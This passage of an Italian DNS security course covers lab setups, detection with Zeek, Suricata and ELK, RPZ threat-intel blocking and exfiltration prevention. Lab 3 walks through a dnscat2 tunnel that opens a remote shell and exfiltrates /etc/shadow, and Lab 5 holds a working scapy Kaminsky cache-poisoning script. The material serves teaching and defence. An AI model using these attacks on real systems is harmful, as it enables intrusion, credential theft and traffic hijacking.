### Lab 1 — Deploy BIND + Unbound + Pi-hole

**Architettura del lab:**

```
Client VMs (10.0.0.0/24)
    │
    ├──→ Pi-hole (10.0.0.10:53) ── filtering + logging
    │        │
    │        └──→ Unbound (10.0.0.11:5353) ── recursive resolver + DNSSEC validation
    │                 │
    │                 └──→ Root Servers (o forwarder)
    │
    └──→ BIND (10.0.0.12:53) ── authoritative per lab.local
```

**Setup Pi-hole + Unbound (Docker Compose):**

```yaml
# docker-compose.yml
services:
  pihole:
    image: pihole/pihole:2025.03.0
    container_name: pihole
    ports:
      - "10.0.0.10:53:53/tcp"
      - "10.0.0.10:53:53/udp"
      - "10.0.0.10:8080:80/tcp"
    environment:
      TZ: "Europe/Rome"
      WEBPASSWORD: "CHANGE_THIS_PASSWORD"
      PIHOLE_DNS_: "10.0.0.11#5353"  # Forward to Unbound
      DNSSEC: "false"  # Unbound handles DNSSEC
    volumes:
      - ./pihole/etc-pihole:/etc/pihole
      - ./pihole/etc-dnsmasq.d:/etc/dnsmasq.d
    restart: unless-stopped
    networks:
      dns_lab:
        ipv4_address: 10.0.0.10

  unbound:
    image: mvance/unbound:1.21.1
    container_name: unbound
    ports:
      - "10.0.0.11:5353:53/tcp"
      - "10.0.0.11:5353:53/udp"
    volumes:
      - ./unbound/unbound.conf:/opt/unbound/etc/unbound/unbound.conf:ro
    restart: unless-stopped
    networks:
      dns_lab:
        ipv4_address: 10.0.0.11

networks:
  dns_lab:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

### Lab 2 — Configure DNSSEC-Signed Zone

```bash
#!/bin/bash
# lab-dnssec-sign.sh — Firma una zona DNS con DNSSEC
# Eseguire su BIND authoritative server

ZONE="lab.local"
ZONE_DIR="/etc/bind/zones"
ZONE_FILE="${ZONE_DIR}/db.${ZONE}"

# 1. Creare la zona base
cat > "${ZONE_FILE}" << 'ZONE_EOF'
$TTL 3600
@   IN  SOA  ns1.lab.local. admin.lab.local. (
        2026050701  ; serial
        3600        ; refresh
        900         ; retry
        604800      ; expire
        300 )       ; neg cache TTL

    IN  NS   ns1.lab.local.
    IN  NS   ns2.lab.local.

ns1 IN  A    10.0.0.12
ns2 IN  A    10.0.0.13

www IN  A    10.0.0.20
mail IN A    10.0.0.21
    IN  MX   10  mail.lab.local.

; Test record per verifica DNSSEC
test IN  A    10.0.0.99
test IN  TXT  "DNSSEC verification record"
ZONE_EOF

# 2. Generare KSK e ZSK
cd "${ZONE_DIR}"
KSK=$(dnssec-keygen -a ECDSAP256SHA256 -f KSK "${ZONE}" 2>&1 | tail -1)
ZSK=$(dnssec-keygen -a ECDSAP256SHA256 "${ZONE}" 2>&1 | tail -1)

echo "[+] KSK: ${KSK}"
echo "[+] ZSK: ${ZSK}"

# 3. Aggiungere le chiavi pubbliche alla zona
cat "${KSK}.key" >> "${ZONE_FILE}"
cat "${ZSK}.key" >> "${ZONE_FILE}"

# 4. Firmare la zona con NSEC3
SALT=$(head -c 8 /dev/urandom | od -A n -t x1 | tr -d ' \n')
dnssec-signzone \
    -A \
    -3 "${SALT}" \
    -N INCREMENT \
    -o "${ZONE}" \
    -t \
    "${ZONE_FILE}"

echo "[+] Zona firmata: ${ZONE_FILE}.signed"
echo "[+] DS record per parent zone:"
dnssec-dsfromkey "${KSK}.key"

# 5. Ricaricare BIND
rndc reload "${ZONE}"

echo "[+] Verifica:"
echo "    dig @10.0.0.12 test.lab.local A +dnssec"
echo "    dig @10.0.0.12 lab.local DNSKEY"
```

### Lab 3 — DNS Tunneling con dnscat2

**Prerequisito:** dominio controllato con NS delegation verso il lab server. Per ambiente locale, configurare BIND come authoritative per `tunnel.lab.local`.

```bash
# === SERVER SIDE (Attacker - 10.0.0.50) ===

# Installazione dnscat2 server
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2
cd /opt/dnscat2/server
gem install bundler
bundle install

# Avvio server
ruby dnscat2.rb tunnel.lab.local --secret=labsecret123 --security=encrypted

# === CLIENT SIDE (Vittima simulata - 10.0.0.60) ===

# Compilazione dnscat2 client
cd /opt/dnscat2/client
make

# Connessione al C2
./dnscat --dns=server=10.0.0.12,domain=tunnel.lab.local --secret=labsecret123

# === COMANDI C2 (dal server) ===

# Lista sessioni
dnscat2> sessions

# Aprire shell interattiva
dnscat2> session -i 1
command (session 1)> shell
sh (session 2)> whoami
sh (session 2)> cat /etc/passwd

# File exfiltration
command (session 1)> download /etc/shadow /tmp/exfil_shadow

# Port forwarding (pivoting)
command (session 1)> listen 127.0.0.1:4444 10.0.0.70:22
# Ora SSH a 10.0.0.70 e' raggiungibile via localhost:4444 sull'attacker
```

### Lab 4 — Detection DNS Tunneling con Zeek e Suricata

```bash
# === SETUP ZEEK ===

# Copiare lo script di detection (dalla sezione 6) nel path Zeek
cp dns-tunnel-detect.zeek /opt/zeek/share/zeek/site/

# Aggiungere al local.zeek
echo '@load dns-tunnel-detect.zeek' >> /opt/zeek/share/zeek/site/local.zeek

# Deploy
zeekctl deploy

# Monitorare i notice log durante il lab 3
tail -f /opt/zeek/logs/current/notice.log

# === SETUP SURICATA ===

# Copiare le regole DNS (dalla sezione 6) 
cp dns-security.rules /etc/suricata/rules/

# Aggiungere al suricata.yaml
# In rule-files: aggiungere
#   - dns-security.rules

# Testare la configurazione
suricata -T -c /etc/suricata/suricata.yaml

# Avviare in modalita' af-packet sull'interfaccia del lab
suricata -c /etc/suricata/suricata.yaml --af-packet=eth0

# Monitorare alerts durante il tunneling
tail -f /var/log/suricata/fast.log
# Output atteso:
# [**] [1:3000001:1] DNS Tunnel - Excessively long subdomain label [**]
# [**] [1:3000002:1] DNS Tunnel - TXT query burst [**]
```

### Lab 5 — DNS Cache Poisoning in Lab

**ATTENZIONE: questo esercizio e' esclusivamente per ambiente di laboratorio isolato. Non eseguire mai cache poisoning su infrastruttura reale senza autorizzazione scritta esplicita.**

```python
#!/usr/bin/env python3
"""DNS cache poisoning PoC — SOLO per lab isolato.

Dimostra il principio del Kaminsky attack in ambiente controllato.
Richiede: scapy (pip install scapy), permessi root.
"""

import sys
import random

try:
    from scapy.all import (
        IP, UDP, DNS, DNSQR, DNSRR, send, sr1,
        RandShort,
    )
except ImportError:
    print("Errore: scapy richiesto. pip install scapy", file=sys.stderr)
    sys.exit(1)

# Target configuration — SOLO lab isolato
TARGET_RESOLVER = "10.0.0.11"    # Unbound nel lab
TARGET_DOMAIN = "lab.local"
ATTACKER_NS_IP = "10.0.0.50"    # IP dell'attacker
SPOOFED_AUTH_IP = "10.0.0.12"   # IP del legittimo authoritative

def trigger_query(resolver: str, subdomain: str) -> None:
    """Forza il resolver a risolvere un subdomain inesistente."""
    query = IP(dst=resolver) / UDP(dport=53) / DNS(
        rd=1,
        qd=DNSQR(qname=f"{subdomain}.{TARGET_DOMAIN}", qtype="A"),
    )
    # Invia senza attendere risposta
    send(query, verbose=False)


def send_spoofed_response(
    resolver: str,
    subdomain: str,
    txid: int,
    src_port: int,
) -> None:
    """Invia una risposta DNS spoofata al resolver."""
    poisoned = (
        IP(src=SPOOFED_AUTH_IP, dst=resolver)
        / UDP(sport=53, dport=src_port)
        / DNS(
            id=txid,
            qr=1,       # Response
            aa=1,       # Authoritative
            rd=1,
            ra=1,
            qd=DNSQR(qname=f"{subdomain}.{TARGET_DOMAIN}", qtype="A"),
            an=DNSRR(
                rrname=f"{subdomain}.{TARGET_DOMAIN}",
                type="A",
                rdata=ATTACKER_NS_IP,
                ttl=86400,
            ),
            ns=DNSRR(
                rrname=TARGET_DOMAIN,
                type="NS",
                rdata=f"ns1.evil.{TARGET_DOMAIN}",
                ttl=86400,
            ),
            ar=DNSRR(
                rrname=f"ns1.evil.{TARGET_DOMAIN}",
                type="A",
                rdata=ATTACKER_NS_IP,
                ttl=86400,
            ),
        )
    )
    send(poisoned, verbose=False)


def kaminsky_demo(resolver: str, attempts: int = 100) -> None:
    """Dimostra il principio del Kaminsky attack.

    In un lab con source port randomization ridotta,
    questo ha una probabilita' significativa di successo.
    """
    print(f"[*] Target resolver: {resolver}")
    print(f"[*] Target domain: {TARGET_DOMAIN}")
    print(f"[*] Attempts: {attempts}")
    print("[!] SOLO PER LAB ISOLATO")

    for attempt in range(attempts):
        random_sub = f"poison{random.randint(100000, 999999)}"
        trigger_query(resolver, random_sub)

        # Inviare risposte spoofate con TXID diversi
        # In un attacco reale, si inviano centinaia di risposte
        # con diversi TXID per ciascuna query triggerata
        for txid_guess in range(0, 65536, 256):
            send_spoofed_response(
                resolver, random_sub, txid_guess, 53
            )

        if attempt % 10 == 0:
            print(f"[*] Attempt {attempt}/{attempts}")

    print("[*] Verifica: dig @{} test.{} A".format(resolver, TARGET_DOMAIN))


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--execute":
        kaminsky_demo(TARGET_RESOLVER)
    else:
        print("Uso: sudo python3 lab-poison.py --execute")
        print("ATTENZIONE: solo per lab isolato con autorizzazione.")
```

### Lab 6 — DNS Monitoring Pipeline con ELK

**Architettura della pipeline:**

```
BIND/Unbound query logs ──→ Filebeat ──→ Logstash ──→ Elasticsearch ──→ Kibana
Zeek dns.log            ──→ Filebeat ──→ Logstash ──→ Elasticsearch ──→ Kibana
Suricata eve.json       ──→ Filebeat ──→ Logstash ──→ Elasticsearch ──→ Kibana
```

**Filebeat configuration per DNS logs:**

```yaml
# /etc/filebeat/filebeat.yml
filebeat.inputs:
  # BIND query logs
  - type: log
    enabled: true
    paths:
      - /var/log/named/queries.log
    fields:
      source: bind
      type: dns_query
    fields_under_root: true

  # Zeek DNS logs
  - type: log
    enabled: true
    paths:
      - /opt/zeek/logs/current/dns.log
    fields:
      source: zeek
      type: dns_zeek
    fields_under_root: true
    exclude_lines: ['^#']

  # Suricata EVE JSON
  - type: log
    enabled: true
    paths:
      - /var/log/suricata/eve.json
    fields:
      source: suricata
      type: dns_suricata
    fields_under_root: true
    json.keys_under_root: true
    json.add_error_key: true

output.logstash:
  hosts: ["10.0.0.30:5044"]
```

**Logstash pipeline per DNS enrichment:**

```ruby
# /etc/logstash/conf.d/dns-pipeline.conf

input {
  beats {
    port => 5044
  }
}

filter {
  if [type] == "dns_query" {
    # Parse BIND query log
    grok {
      match => {
        "message" => "%{TIMESTAMP_ISO8601:timestamp} queries: info: client @%{NOTSPACE} %{IP:client_ip}#%{INT:client_port} \(%{DATA:query_name}\): query: %{DATA:query_name_full} IN %{WORD:query_type}"
      }
    }
  }

  if [type] == "dns_zeek" {
    # Parse Zeek tab-separated DNS log
    csv {
      separator => "	"
      columns => [
        "ts", "uid", "orig_h", "orig_p", "resp_h", "resp_p",
        "proto", "trans_id", "rtt", "query", "qclass",
        "qclass_name", "qtype", "qtype_name", "rcode",
        "rcode_name", "AA", "TC", "RD", "RA", "Z", "answers",
        "TTLs", "rejected"
      ]
    }
    mutate {
      rename => {
        "orig_h" => "client_ip"
        "query" => "query_name"
        "qtype_name" => "query_type"
        "rcode_name" => "response_code"
      }
    }
  }

  # Enrichment: extract parent domain
  if [query_name] {
    ruby {
      code => '
        qname = event.get("query_name").to_s.downcase
        parts = qname.split(".")
        if parts.length >= 2
          event.set("parent_domain", parts[-2..-1].join("."))
          event.set("subdomain_length", parts[0].length) if parts.length > 2
          event.set("label_count", parts.length)
        end
      '
    }

    # Entropy calculation
    ruby {
      code => '
        qname = event.get("query_name").to_s
        parts = qname.split(".")
        label = parts.length >= 2 ? parts[-2] : parts[0]
        if label && label.length > 0
          freq = label.chars.group_by(&:itself).transform_values(&:count)
          len = label.length.to_f
          entropy = freq.values.inject(0.0) { |sum, c|
            p = c / len
            sum - p * Math.log2(p)
          }
          event.set("domain_entropy", entropy.round(3))
        end
      '
    }
  }

  # GeoIP enrichment per answer IPs
  if [answers] {
    geoip {
      source => "answers"
      target => "answer_geo"
      database => "/usr/share/GeoIP/GeoLite2-City.mmdb"
      tag_on_failure => ["_geoip_lookup_failure"]
    }
  }
}

output {
  elasticsearch {
    hosts => ["10.0.0.30:9200"]
    index => "dns-security-%{+YYYY.MM.dd}"
  }
}
```

**Kibana dashboard queries utili:**

```
# Query per individuare potenziale DGA
domain_entropy:>3.5 AND subdomain_length:>15

# Query per individuare DNS tunneling
query_type:TXT AND parent_domain:<dominio_sospetto>

# Query volume anomalo per singolo client
# Usare aggregation: terms su client_ip, metrics: count, threshold > 1000/5min

# NXDOMAIN spike
response_code:NXDOMAIN | date_histogram interval:5m count > baseline*3

# Query a NRD (Newly Registered Domains)
# Richiede feed NRD caricato come threat intel list in Elasticsearch
# Usare: indicator_match rule con indice NRD
```

---

## 11. DNS Crittografato — DoQ, DDR e Architettura Enterprise

### DNS over QUIC (DoQ — RFC 9250)

DNS over QUIC (DoQ), standardizzato nell'RFC 9250, rappresenta la terza generazione di trasporto DNS crittografato dopo DoT (RFC 7858) e DoH (RFC 8484). DoQ utilizza il protocollo QUIC (RFC 9000), che integra TLS 1.3 direttamente nel livello di trasporto, eliminando il round-trip aggiuntivo richiesto da TCP+TLS e offrendo proprieta' superiori in termini di latenza e resilienza.

**Caratteristiche tecniche di DoQ:**

- **Porta dedicata:** 853/udp (stessa porta di DoT ma su UDP, non TCP). Questa scelta semplifica la coesistenza con DoT ma introduce ambiguita' a livello firewall: un pacchetto sulla porta 853 potrebbe essere DoT (TCP) o DoQ (QUIC/UDP).
- **Multiplexing senza head-of-line blocking:** ogni query DNS viene inviata su uno stream QUIC indipendente. La perdita di un pacchetto non blocca le query successive, a differenza di DoT dove una singola connessione TCP trasporta query sequenziali e la perdita di un segmento blocca tutte le query in coda.
- **0-RTT resumption:** dopo la prima connessione, le connessioni successive possono inviare dati al primo pacchetto (0-RTT), riducendo la latenza a livelli comparabili con DNS su UDP in chiaro. Attenzione: il 0-RTT e' vulnerabile a replay attack — il resolver deve implementare protezione contro replay per query non idempotenti.
- **Connection migration:** QUIC supporta la migrazione della connessione quando l'IP del client cambia (es. cambio WiFi/cellulare), mantenendo la sessione DNS attiva senza re-handshake.
- **Padding obbligatorio:** RFC 9250 raccomanda il padding delle query DoQ per mitigare attacchi di traffic analysis basati sulla dimensione dei pacchetti.

**Confronto prestazionale DoT vs DoH vs DoQ:**

| Parametro | DoT | DoH | DoQ |
|---|---|---|---|
| Protocollo trasporto | TCP + TLS 1.3 | TCP + TLS 1.3 + HTTP/2-3 | QUIC (TLS 1.3 integrato) |
| Porta | 853/tcp | 443/tcp | 853/udp |
| Latenza primo handshake | 2-3 RTT | 2-3 RTT | 1 RTT |
| Latenza resumption | 1 RTT | 1 RTT | 0 RTT |
| Head-of-line blocking | Si (TCP) | Si (TCP), no con HTTP/3 | No |
| Identificabilita' firewall | Facile (porta 853) | Difficile (porta 443) | Media (porta 853, UDP) |
| Overhead per query | Basso | Medio (HTTP framing) | Molto basso |
| Adozione resolver 2026 | Alta | Alta | Crescente |

**Resolver pubblici con supporto DoQ (2026):**

- **AdGuard DNS:** `quic://dns.adguard-dns.com` (primo resolver commerciale con supporto DoQ completo)
- **Quad9:** `quic://dns.quad9.net:8853` (porta 8853 per DoQ)
- **NextDNS:** `quic://dns.nextdns.io`
- **Mullvad DNS:** `quic://dns.mullvad.net`

**Implicazioni di sicurezza enterprise:**

DoQ su porta 853/udp e' piu' facile da identificare e bloccare rispetto a DoH (porta 443), ma piu' difficile da ispezionare rispetto a DoT (TCP). Il traffico QUIC puo' essere bloccato a livello firewall bloccando la porta 853/udp, ma organizzazioni che permettono QUIC per altri servizi (HTTP/3) devono implementare deep packet inspection per distinguere DoQ da altro traffico QUIC.

La raccomandazione enterprise per il 2025-2026 e':
1. Implementare DoT verso resolver interni per il traffico client → resolver
2. Valutare DoQ per comunicazioni resolver → resolver e resolver → authoritative quando la latenza e' critica
3. Bloccare DoH e DoQ verso resolver esterni non autorizzati
4. Monitorare il traffico QUIC sulla porta 853 per rilevare bypass non autorizzati

### Discovery of Designated Resolvers (DDR — RFC 9462)

DDR permette ai client di scoprire automaticamente se il resolver DNS supporta trasporti crittografati (DoT, DoH, DoQ). Il client invia una query di tipo SVCB per `_dns.resolver.arpa` al resolver configurato, e il resolver risponde con i trasporti crittografati disponibili.

```dns
; Query DDR
_dns.resolver.arpa.  IN  SVCB  ?

; Risposta dal resolver con supporto DoT + DoH + DoQ
_dns.resolver.arpa.  300  IN  SVCB  1  dns.example.com. (
    alpn="dot,h2,doq"
    port="853"
    ipv4hint="10.0.0.1"
    ipv6hint="2001:db8::1"
)
```

**Rischi DDR:** un attaccante che controlla il percorso di rete puo' intercettare la query DDR (in chiaro, su DNS tradizionale) e rispondere con un resolver malevolo crittografato. Il client, pensando di aver scoperto il trasporto sicuro del resolver legittimo, inizia a inviare tutte le query al resolver dell'attaccante via DoT/DoH. Mitigazione: DDR richiede che il certificato TLS del resolver designato corrisponda all'IP del resolver originale (verificabile via DANE o certificato con SAN).

### Architettura DNS Enterprise — Design Pattern Sicuro

In un ambiente enterprise moderno, l'architettura DNS dovrebbe implementare piu' livelli di difesa:

```
                           ┌─────────────────────┐
                           │  Threat Intel Feeds  │
                           │  (Spamhaus, SURBL,   │
                           │   Abuse.ch, DNSDB)   │
                           └──────────┬──────────┘
                                      │ Zone Transfer / API
                                      ↓
┌──────────────┐   DoT    ┌───────────────────────┐   DoT    ┌──────────────┐
│ Client Stub  │─────────→│   Internal Recursive  │────────→│   Upstream    │
│  (systemd-   │          │   Resolver Cluster    │          │  Forwarder   │
│  resolved /  │          │   (Unbound / Knot)    │          │  (1.1.1.1 /  │
│  dnscrypt)   │          │                       │          │   9.9.9.9)   │
└──────────────┘          │  ┌─────────────────┐  │          └──────────────┘
                          │  │  RPZ Engine      │  │
                          │  │  - Malware block │  │
                          │  │  - Phishing block│  │
                          │  │  - DGA block     │  │
                          │  │  - C2 sinkhole   │  │
                          │  └─────────────────┘  │
                          │                       │
                          │  ┌─────────────────┐  │
                          │  │  DNSSEC Valid.   │  │
                          │  │  (auto-trust)    │  │
                          │  └─────────────────┘  │
                          │                       │
                          │  ┌─────────────────┐  │
                          │  │  Query Logging   │  │──→ SIEM (Splunk/Elastic)
                          │  │  (dnstap)        │  │
                          │  └─────────────────┘  │
                          └───────────────────────┘
                                      │
                                      ↓
                          ┌───────────────────────┐
                          │   Sinkhole Server     │
                          │   (10.0.0.100)        │
                          │   - Log infected hosts│
                          │   - Capture callbacks │
                          │   - Warning page      │
                          └───────────────────────┘
```

**Principi architetturali chiave:**

1. **Crittografia end-to-end:** DoT tra client e resolver interno; DoT/DoQ tra resolver interno e upstream. Mai DNS in chiaro tra componenti.
2. **Single point of policy enforcement:** tutte le policy DNS (RPZ, filtering, logging) si applicano al resolver interno. I client non possono bypassare il resolver (firewall blocca porta 53, 853, 443 verso destinazioni DNS esterne non autorizzate).
3. **Redundanza:** cluster di almeno 2 resolver con health check e failover automatico. I client hanno un resolver primario e uno secondario configurati.
4. **Segmentazione:** resolver separati per reti con requisiti diversi (guest network, IoT, server farm, user workstation). Ogni segmento ha RPZ e policy specifiche.
5. **Immutabilita' dei log:** i query log DNS vengono inviati via dnstap a un collector separato con storage immutabile (write-once). Nessun processo sul resolver puo' cancellare o modificare i log dopo la scrittura.

---

## 12. RPZ Avanzate e Integrazione Threat Intelligence

### Architettura RPZ Multi-Feed

Un'implementazione RPZ enterprise utilizza tipicamente piu' zone RPZ simultaneamente, ciascuna alimentata da una fonte di threat intelligence diversa. La priorita' delle zone determina quale policy prevale in caso di conflitto.

**Configurazione BIND con RPZ multi-feed:**

```bind
// /etc/bind/named.conf — RPZ multi-feed

// RPZ zones — ordine di priorita' decrescente
response-policy {
    // Feed 1: threat intelligence commerciale (massima priorita')
    zone "rpz.spamhaus.dbl"
        policy given
        recursive-only yes
        max-policy-ttl 300
        min-update-interval 60;

    // Feed 2: blocklist malware locale
    zone "rpz.local-malware"
        policy given
        recursive-only yes
        max-policy-ttl 300;

    // Feed 3: DGA domains auto-generati
    zone "rpz.dga-block"
        policy given
        recursive-only yes
        max-policy-ttl 60;

    // Feed 4: phishing feed community
    zone "rpz.phishing-community"
        policy given
        recursive-only yes
        max-policy-ttl 600;

    // Feed 5: whitelist (eccezioni) — PASSTHRU override
    zone "rpz.whitelist"
        policy passthru
        recursive-only yes;
} qname-wait-recurse no;

// Zone transfer da provider commerciale (Spamhaus)
zone "rpz.spamhaus.dbl" {
    type secondary;
    primaries { 34.194.195.25; 35.156.219.71; };
    file "/var/cache/bind/rpz.spamhaus.dbl.zone";
    allow-query { none; };
    allow-transfer { none; };
};

// Zona RPZ locale per malware custom
zone "rpz.local-malware" {
    type primary;
    file "/etc/bind/zones/rpz.local-malware.zone";
    allow-query { none; };
    allow-transfer { "transfer-peers"; };
    allow-update { 127.0.0.1; };  // nsupdate per automazione
};

// Zona RPZ per DGA auto-update
zone "rpz.dga-block" {
    type primary;
    file "/etc/bind/zones/rpz.dga-block.zone";
    allow-query { none; };
    allow-update { 127.0.0.1; };
};

// Whitelist
zone "rpz.whitelist" {
    type primary;
    file "/etc/bind/zones/rpz.whitelist.zone";
    allow-query { none; };
};
```

### RPZ su Unbound

Unbound supporta RPZ dalla versione 1.14.0. La configurazione e' integrata nel file `unbound.conf`:

```yaml
# /etc/unbound/unbound.conf — RPZ configuration

rpz:
    # Feed locale di malware blocking
    name: "rpz.local-malware"
    zonefile: "/etc/unbound/rpz/malware.zone"
    rpz-action-override: "nxdomain"
    rpz-log: yes
    rpz-log-name: "malware-rpz"

    # Feed secondario via zone transfer
    name: "rpz.spamhaus.dbl"
    primary: 34.194.195.25
    rpz-action-override: "nxdomain"
    rpz-log: yes
    rpz-log-name: "spamhaus-rpz"

    # Tag-based RPZ — applica solo a client con tag specifico
    # Richiede define-tag e access-control-tag nella sezione server
    tags: "malware-filter"
```

La funzionalita' di tagging di Unbound permette RPZ differenziate per segmento di rete: i client della rete guest possono avere filtering aggressivo (malware + phishing + adult content), mentre i client della rete server ricevono solo il filtering malware.

### Script di Aggiornamento RPZ Automatizzato

```bash
#!/bin/bash
# rpz-feed-updater.sh — Aggiorna automaticamente le zone RPZ
# da feed di threat intelligence
# Esecuzione: crontab — ogni 30 minuti
#   */30 * * * * /usr/local/sbin/rpz-feed-updater.sh >> /var/log/rpz-update.log 2>&1

set -euo pipefail

ZONE_DIR="/etc/bind/zones"
RPZ_ZONE="${ZONE_DIR}/rpz.local-malware.zone"
WORK_DIR="/tmp/rpz-update-$$"
LOG_TAG="rpz-update"
SINKHOLE_IP="10.0.0.100"
SERIAL_FILE="${ZONE_DIR}/.rpz-serial"

# Feed URLs (fonti gratuite verificate)
FEEDS=(
    "https://urlhaus.abuse.ch/downloads/rpz/"
    "https://raw.githubusercontent.com/stamparm/maltrail/master/trails/static/malware/domain.txt"
    "https://hole.cert.pl/domains/domains.txt"
    "https://phishing.army/download/phishing_army_blocklist.txt"
)

logger -t "${LOG_TAG}" "Inizio aggiornamento RPZ"

mkdir -p "${WORK_DIR}"
trap 'rm -rf "${WORK_DIR}"' EXIT

# Scaricare tutti i feed
DOMAINS_FILE="${WORK_DIR}/all_domains.txt"
touch "${DOMAINS_FILE}"

for feed_url in "${FEEDS[@]}"; do
    feed_file="${WORK_DIR}/feed_$(echo "${feed_url}" | md5sum | cut -c1-8).txt"
    if curl -sS --max-time 30 --retry 2 -o "${feed_file}" "${feed_url}" 2>/dev/null; then
        # Estrarre solo i domini validi (ignorare commenti, IP, righe vuote)
        grep -oP '^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)+$' \
            "${feed_file}" >> "${DOMAINS_FILE}" 2>/dev/null || true
        logger -t "${LOG_TAG}" "Feed scaricato: ${feed_url}"
    else
        logger -t "${LOG_TAG}" "ERRORE download: ${feed_url}"
    fi
done

# Deduplicare e ordinare
UNIQUE_COUNT=$(sort -u "${DOMAINS_FILE}" | wc -l)
logger -t "${LOG_TAG}" "Domini unici da bloccare: ${UNIQUE_COUNT}"

# Incrementare serial
if [ -f "${SERIAL_FILE}" ]; then
    SERIAL=$(($(cat "${SERIAL_FILE}") + 1))
else
    SERIAL=$(date +%Y%m%d01)
fi
echo "${SERIAL}" > "${SERIAL_FILE}"

# Generare zona RPZ
NEW_ZONE="${WORK_DIR}/rpz.zone"
cat > "${NEW_ZONE}" << ZONE_HEADER
\$TTL 300
@  IN  SOA  localhost. admin.localhost. (
       ${SERIAL}   ; serial
       3600         ; refresh
       900          ; retry
       604800       ; expire
       300 )        ; minimum TTL
   IN  NS   localhost.

; === RPZ auto-generated ===
; Feed update: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
; Unique domains: ${UNIQUE_COUNT}

ZONE_HEADER

# Aggiungere ogni dominio come CNAME . (NXDOMAIN) + wildcard
sort -u "${DOMAINS_FILE}" | while IFS= read -r domain; do
    # Validare il dominio
    if [[ "${domain}" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\.\-]*[a-zA-Z0-9])?$ ]]; then
        echo "${domain}    CNAME  ."
        echo "*.${domain}  CNAME  ."
    fi
done >> "${NEW_ZONE}"

# Verificare la zona con named-checkzone
if named-checkzone "rpz.local-malware" "${NEW_ZONE}" > /dev/null 2>&1; then
    cp "${NEW_ZONE}" "${RPZ_ZONE}"
    rndc reload "rpz.local-malware" 2>/dev/null || rndc reconfig
    logger -t "${LOG_TAG}" "RPZ aggiornata con successo: serial=${SERIAL} domains=${UNIQUE_COUNT}"
else
    logger -t "${LOG_TAG}" "ERRORE: zona RPZ invalida, aggiornamento annullato"
    exit 1
fi
```

### Conversione IOC a RPZ con ioc2rpz

`ioc2rpz` e' un framework open source che converte indicatori di compromissione (IOC) da threat intelligence feed in zone RPZ in tempo reale. Supporta feed in formato STIX/TAXII, CSV, JSON e testo semplice, e serve le zone RPZ risultanti via DNS zone transfer standard (AXFR/IXFR).

**Vantaggi di ioc2rpz:**
- Conversione automatica senza scripting personalizzato
- Supporto per feed multipli con priorita' e deduplicazione
- Zone transfer incrementale (IXFR) per aggiornamenti efficienti
- Whitelisting integrato per prevenire falsi positivi
- API per gestione e monitoraggio

---

## 13. DNS Exfiltration Prevention e DLP

### Analisi della Superficie di Esfiltrazione DNS

Il DNS rappresenta uno dei canali di esfiltrazione piu' insidiosi perche' il traffico DNS e' quasi universalmente permesso attraverso i perimetri di rete. A differenza di HTTP, FTP o SMTP, il DNS raramente viene bloccato o ispezionato in profondita' dai firewall tradizionali. Anche le organizzazioni con DLP (Data Loss Prevention) maturi spesso non monitorano il canale DNS.

**Vettori di esfiltrazione DNS:**

| Metodo | Capacita' | Rilevabilita' | Complessita' |
|---|---|---|---|
| Subdomain encoding diretto | ~150 byte/query | Media | Bassa |
| TXT record query con payload | ~200 byte/query | Media-Alta | Bassa |
| Slow drip (1 query/minuto) | ~2.4 KB/ora | Molto bassa | Media |
| Steganografia TTL | ~2 bit/risposta | Estremamente bassa | Alta |
| DNS over HTTPS tunnel | Illimitata | Molto bassa (crittografato) | Media |
| CNAME chaining | ~60 byte/query | Bassa | Media |
| NULL record abuse | ~500 byte/query | Alta | Bassa |

### Strategia di Prevenzione Multi-Livello

**Livello 1 — Controllo del perimetro DNS:**

Forzare tutti i client a utilizzare esclusivamente il resolver DNS interno. Bloccare al firewall qualsiasi traffico DNS (porta 53/udp, 53/tcp, 853/tcp, 853/udp) verso destinazioni non autorizzate. Bloccare i resolver DoH pubblici noti (lista aggiornabile via feed).

```
# Regole firewall iptables — bloccare DNS diretto verso l'esterno
# Permettere solo verso il resolver interno (10.0.0.1)

iptables -A FORWARD -p udp --dport 53 -d 10.0.0.1 -j ACCEPT
iptables -A FORWARD -p tcp --dport 53 -d 10.0.0.1 -j ACCEPT
iptables -A FORWARD -p udp --dport 53 -j DROP
iptables -A FORWARD -p tcp --dport 53 -j DROP
iptables -A FORWARD -p tcp --dport 853 -j DROP
iptables -A FORWARD -p udp --dport 853 -j DROP

# Bloccare resolver DoH noti
# (lista parziale — mantenere aggiornata)
for doh_ip in 8.8.8.8 8.8.4.4 1.1.1.1 1.0.0.1 9.9.9.9 149.112.112.112; do
    iptables -A FORWARD -d "${doh_ip}" -p tcp --dport 443 -j DROP
done
```

**Livello 2 — Analisi comportamentale sul resolver:**

Implementare regole di detection sul resolver o sul SIEM che identificano pattern di esfiltrazione:

```python
#!/usr/bin/env python3
"""DNS exfiltration detector — analisi in tempo reale dei log DNS.

Identifica pattern di esfiltrazione basati su:
- Volume di dati nei subdomain labels
- Frequenza di query uniche verso un singolo parent domain
- Rapporto tra dimensione totale dei subdomain e numero di query
- Pattern temporali (beaconing regolare)
"""

import sys
import time
from collections import defaultdict
from dataclasses import dataclass, field


@dataclass
class ExfilTracker:
    """Traccia i dati potenzialmente esfiltrati per coppia client-domain."""
    total_bytes: int = 0
    query_count: int = 0
    unique_subdomains: set = field(default_factory=set)
    timestamps: list = field(default_factory=list)
    txt_queries: int = 0
    max_label_len: int = 0


# Soglie configurabili
EXFIL_BYTES_THRESHOLD = 10_000       # 10 KB in subdomain data
UNIQUE_SUB_THRESHOLD = 200           # 200 subdomain unici in finestra
BEACON_REGULARITY_THRESHOLD = 0.15   # Deviazione standard / media < 0.15
WINDOW_SECONDS = 300                 # Finestra di analisi: 5 minuti
TXT_QUERY_RATIO_THRESHOLD = 0.5      # >50% query TXT e' sospetto


def analyze_exfil_risk(tracker: ExfilTracker) -> tuple[bool, list[str]]:
    """Analizza il rischio di esfiltrazione per un tracker."""
    alerts = []

    # Check 1: volume dati nei subdomain
    if tracker.total_bytes > EXFIL_BYTES_THRESHOLD:
        alerts.append(
            f"HIGH: {tracker.total_bytes} bytes nei subdomain "
            f"(soglia: {EXFIL_BYTES_THRESHOLD})"
        )

    # Check 2: subdomain unici
    unique_count = len(tracker.unique_subdomains)
